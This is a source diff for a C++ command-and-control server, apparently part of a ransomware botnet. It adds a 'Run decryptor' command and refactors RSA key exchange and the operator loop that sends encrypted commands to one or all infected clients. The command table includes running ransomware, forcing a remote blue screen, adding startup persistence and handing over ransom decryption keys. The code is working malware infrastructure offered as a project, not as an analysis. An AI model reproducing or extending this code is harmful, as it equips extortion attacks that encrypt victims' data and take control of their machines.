@@ -40,7 +40,8 @@ const std::map<Action, std::string> ServerCommands =
     { kKillClient,        "Forcefully disconnect the client from the C2 server." },
     { kRansomwareEnable,  "Run ransomware on the client." },
     { kAddToStartup,      "Add a program to the startup registry."},
-    { kSetAsDecryptionKey, "Send client decryption key for ransom."}
+    { kSetAsDecryptionKey, "Send client decryption key for ransom."},
+    { kRunDecryptor, "Run decryptor. Only works if you sent the client decryption key."}
 };
 
 /*
@@ -100,62 +101,44 @@ bool ServerInterface::ExchangeCryptoKeys(long cuid) {
     if ( !client )
         return false;
 
-    // convert our public key to der format
-    int            len = i2d_RSAPublicKey(this->m_SessionKeys.pub, nullptr); // len of pub key in der format
-    unsigned char* data = NULL; // public key as der format
-
-    i2d_RSAPublicKey(this->m_SessionKeys.pub, &data);
+    DER data = LGCrypto::RSAKeyToDer(this->m_SessionKeys.pub, false);
     
-
     // send session public key
-    int sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
-    if ( sent <= 0 ) {
-        free(data);
+    int sent = Send(client->GetSocket(), ( char* )&data.len, sizeof(data.len), 0); // Send size of private key first
+    if ( sent <= 0 )
         return false;
-    }
 
-    sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
-    if ( sent <= 0 ) {
-        free(data);
+    sent = Send(client->GetSocket(), ( char* ) data.data, data.len, 0); // send der format of rsa key
+    if ( sent <= 0 )
         return false;
-    }
-    std::cout << "sent session key" << std::endl;
 
     // send ransom public key
-    len = i2d_RSAPublicKey(client->GetRansomSecrets().pub, nullptr);
-    data = NULL;
-    i2d_RSAPublicKey(client->GetRansomSecrets().pub, &data);
+    data = LGCrypto::RSAKeyToDer(client->GetRansomSecrets().pub, false);
+    std::cout << "Sending initial ransom secrets pub key" << std::endl;
+    std::cout << "Len: " << data.len << std::endl;
+    std::cout << data.data << std::endl;
 
-    sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
-    if ( sent <= 0 ) {
-        free(data);
+    sent = Send(client->GetSocket(), ( char* ) &data.len, sizeof(data.len), 0); // Send size of private key first
+    if ( sent <= 0 )
         return false;
-    }
-    std::cout << "sent size of ransom key" << std::endl;
 
-    sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
-    if ( sent <= 0 ) {
-        free(data);
+    sent = Send(client->GetSocket(), ( char* ) data.data, data.len, 0); // send der format of rsa key
+    if ( sent <= 0 )
         return false;
-    }
-    std::cout << "sent ransom key" << std::endl;
 
     // now receive the public key
     int            clientLen = 0;
     unsigned char* clientDer = NULL;
 
     int received = Receive(client->GetSocket(), ( char* ) &clientLen, sizeof(clientLen), 0);
-    if ( received <= 0 ) {
-        free(data);
-        return FALSE;
-    }
+    if ( received <= 0 )
+        return false;
 
     clientDer = ( unsigned char* ) malloc(clientLen);
     received = Receive(client->GetSocket(), ( char* ) clientDer, clientLen, 0);
     if ( received <= 0 ) {
-        free(data);
         free(clientDer);
-        return FALSE;
+        return false;
     }
 
     const unsigned char* constDer = clientDer;
@@ -170,7 +153,6 @@ bool ServerInterface::ExchangeCryptoKeys(long cuid) {
     BYTESTRING encryptedB64AES = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
     m_NetworkManager.TransmitData(encryptedB64AES, client->GetSocket(), TCP);
 
-    free(data);
     free(clientDer);
     return true;
 }
@@ -207,8 +189,6 @@ void ServerInterface::ListenForUDPMessages() {
         memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
 
         m_NetworkManager.TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
-
-        //PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
     }
 }
 
@@ -527,8 +507,6 @@ void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
     RSAKeys    ransomKeys = LGCrypto::GenerateRSAPair(2048); // generate rsa keys for the client
     BYTESTRING aesKey     = LGCrypto::Generate256AESKey();
     
-    std::cout << "client connected" << std::endl;
-
     client.SetRansomSecrets(ransomKeys);
     client.SetAESKey(aesKey);
     
@@ -572,13 +550,14 @@ unsigned int ServerInterface::GetFlagsFromInput(const std::string& s) {
 bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputCommand) {
     bool performed = false;
     Packet cmdInfo = {};
-    cmdInfo.action = static_cast<Action>(command);
+    cmdInfo.action = static_cast< Action >( command );
 
     switch ( command ) {
     case Action::kSetAsDecryptionKey:
-        // todo convert rsa key from base64 saved from server state json for client
-        // convert to der, send it in buffer and send the size of the key in buffLen
+        cmdInfo.flags = PACKET_IS_A_COMMAND;
+        performed = true;
         break;
+    case Action::kRunDecryptor:
     case Action::kRansomwareEnable: {
         std::string input;
         std::string confirmation;
@@ -611,6 +590,9 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         cmdInfo.flags = GetFlagsFromInput(flagInput);
         cmdInfo.insert(input);
 
+        if ( cmdInfo.buffLen == -1 ) // error
+            break;
+
         performed = true;
         break;
     }
@@ -624,8 +606,11 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         std::string input;
         std::cout << "Path of program to add to startup: ";
         std::getline(std::cin, input);
-        
+
         cmdInfo.insert(input);
+
+        if ( cmdInfo.buffLen == -1 )
+            break;
 
         performed = true;
         break;
@@ -648,6 +633,7 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         performed = true;
         break;
     }
+                                // no additional user input required 
     case Action::kRemoteBSOD:
         cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
         performed = true;
@@ -719,130 +705,110 @@ bool ServerInterface::IsServerCommand(long command) {
 }
 
 void ServerInterface::OutputClientList() {
+    std::cout << std::endl;
     std::cout << "Showing all (" << this->m_ClientList.size() << ") connected clients:" << std::endl;
     std::cout << "CUID  | Name            | Machine GUID" << std::endl;
     for ( auto& [cuid, client] : this->m_ClientList )
         std::cout << cuid << " - " << client.GetDesktopName() << " - " << client.GetMachineGUID() << std::endl;
+    std::cout << std::endl;
+}
+
+void HaltOutput() {
+    system("pause");
+    system("cls");
+}
+
+bool ParseClientID(std::string& strClientID, long& intClientID) {
+    try { intClientID = std::stol(strClientID); }
+    catch ( std::invalid_argument ) { return false; }
+    catch ( std::out_of_range ) { return false; }
+    
+    return true;
+}
+
+bool ParseCommand(std::string& strCommandID, Action& command) {
+    try { command = static_cast< Action >( std::stol(strCommandID) ); }
+    catch ( std::invalid_argument& err ) { return false; }
+    catch ( std::out_of_range& err ) { return false;  }
+    
+    return ServerInterface::IsServerCommand(command);
 }
 
 void ServerInterface::RunUserInputOnClients() {
     while ( this->m_TCPServerDetails.alive ) {
         // select which client to run command on
-        std::string  clientID;    
-        long         lClientID     = 0;
+        std::string  strClientID;    
+        long         intClientID     = 0;
         Client*      client        = nullptr;
-        BOOL         performed     = FALSE;
-        BOOL         globalCommand = FALSE; // perform command on all clients
-        Action       lCommand      = kNone;
-        BOOL         sent          = FALSE;
-        std::string  command;
-        int          performees = 0;
 
-        std::cout << std::endl;
-        OutputClientList();
-        std::cout << std::endl;
+        this->OutputClientList();
+
         std::cout << "[Client ID to perform command on; 0 for all]: ";
-        std::getline(std::cin, clientID);
+        std::getline(std::cin, strClientID);
         
-        try {
-            if ( (lClientID = std::stol(clientID)) == 0 )
-                globalCommand = TRUE;
-        } catch ( std::invalid_argument ) {
-            std::cout << "Input Error; Invalid input." << std::endl;
-            system("pause");
-            system("cls");
-            continue;
-        } catch ( std::out_of_range ) {
-            std::cout << "Input Error; Number too large" << std::endl;
-            system("pause");
-            system("cls");
+        if ( !ParseClientID(strClientID, intClientID) ) {
+            std::cout << "Error getting client from client ID" << std::endl;
+            HaltOutput();
             continue;
         }
 
+        bool globalCommand = (intClientID == 0); // perform command on all clients
+
         if ( !globalCommand ) {
-            client = GetClientPtr(std::stol(clientID));
+            client = GetClientPtr(intClientID);
             if ( !client ) {
-                system("cls");
+                std::cout << "Client with " << intClientID << " doesn't exist." << std::endl;
+                HaltOutput();
                 continue;
             }
         }
         
         this->OutputServerCommands();
 
+        Action       commandID = kNone;
+        std::string  strCommand;
+
         std::cout << "[# Command to perform]: ";
-        std::getline(std::cin, command);
+        std::getline(std::cin, strCommand);
 
-        try {
-            lCommand = static_cast<Action>(std::stol(command));
-        } catch ( std::invalid_argument& err ) {
-            std::cout << "Input Error; Invalid input." << std::endl;
-            system("pause");
-            system("cls");
-            continue;
-        } catch ( std::out_of_range& err ) {
-            std::cout << "Input Error; Number too large" << std::endl;
-            system("pause");
-            system("cls");
-            continue;
-        }
-
-        if ( !IsServerCommand(lCommand) ) {
-            std::cout << "Invalid command; " << lCommand << " Not a command" << std::endl;
-            system("pause");
-            system("cls");
-            continue;
-        }
-        
-        if ( globalCommand && lCommand == kSetAsDecryptionKey ) {
-            std::cout << "Can't send decryption keys to all clients at once. Do it manually. :(" << std::endl;
-            system("pause");
-            system("cls");
+        if ( !ParseCommand(strCommand, commandID) || globalCommand && commandID == kSetAsDecryptionKey ) {
+            std::cout << "Invalid command" << std::endl;
+            HaltOutput();
             continue;
         }
 
         Packet toSend;
-        bool userInput = HandleUserInput(lCommand, toSend); // fill packet with info
+        toSend.action = commandID;
+
+        bool userInput = HandleUserInput(commandID, toSend); // fill packet with info
         if ( !userInput ) {
             std::cout << "Error taking user input." << std::endl;
-            system("pause");
-            system("cls");
+            HaltOutput();
             continue;
         }
 
         if ( !globalCommand ) {
             BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, client->GetAESKey(), LGCrypto::GenerateAESIV());
 
-            sent = m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);
+            m_NetworkManager.TransmitData(encrypted, client->GetSocket(), TCP);
 
             if ( toSend.action == kKillClient )
                 RemoveClientFromServer(client);
         } else {
             for ( auto& [ cuid, host ] : this->m_ClientList ) {
-                if ( host.Alive == FALSE )
-                    continue;
+                if ( !host.Alive ) continue;
 
-                BYTESTRING encrypted = LGCrypto::EncryptStruct(toSend, host.GetAESKey(), LGCrypto::GenerateAESIV());
-                sent = m_NetworkManager.TransmitData(encrypted, host.GetSocket(), TCP);
-
-                if ( !sent ) {
-                    std::cout << "There was an error sending your command. Is the client alive?" << std::endl;
-                    std::cout << "Details: \n";
-                    std::cout << "Recipient CUID:         " << host.ClientUID << std::endl;
-                    std::cout << "Recipient Machine GUID: " << host.GetMachineGUID() << std::endl;
-                    std::cout << "Recipient Desktop Name: " << host.GetDesktopName() << std::endl;
-                    std::cout << "Sent packet size:       " << encrypted.size() << " bytes" << std::endl;
-                    continue;
-                }
+                m_NetworkManager.TransmitData(LGCrypto::EncryptStruct(toSend, host.GetAESKey(), LGCrypto::GenerateAESIV()), host.GetSocket(), TCP);
                 
-                performees++;
-
                 if ( toSend.action == kKillClient )
                     RemoveClientFromServer(&host);
             }
-            std::cout << "Performed command on " << std::to_string(performees) << " clients." << std::endl;
         }
-        system("pause");
-        system("cls");
+
+        if ( toSend.action == kSetAsDecryptionKey )
+            m_NetworkManager.TransmitRSAKey(client->GetSocket(), client->GetRansomSecrets().priv, true);
+
+        HaltOutput();
     }
 }
 
